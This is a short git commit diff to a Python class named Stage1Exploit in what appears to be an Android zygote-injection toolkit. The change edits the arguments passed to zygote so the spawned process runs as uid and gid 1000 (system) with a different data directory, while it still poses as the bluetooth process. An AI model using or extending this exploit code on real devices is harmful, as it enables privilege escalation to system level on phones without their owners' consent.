5243cfa5276934177402a5e7d05bc8c9e4e9f636
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-09-01 22:54:29 +0900

    Update stage1.py

--- zygote_injection_toolkit/stage1.py
+++ zygote_injection_toolkit/stage1.py
@@ -189,11 +189,11 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=1002",
-            "--setgid=0",
+            "--setuid=1000",
+            "--setgid=1000",
             "--setgroups=3003",
             "--target-sdk-version=28",
-            "--app-data-dir=/data/user/0/com.android.bluetooth",
+            "--app-data-dir=/data/user/0/.dataservices",
             "--runtime-args",
             "--nice-name=bluetooth",
             "--seinfo=platform:bluetooth:complete",
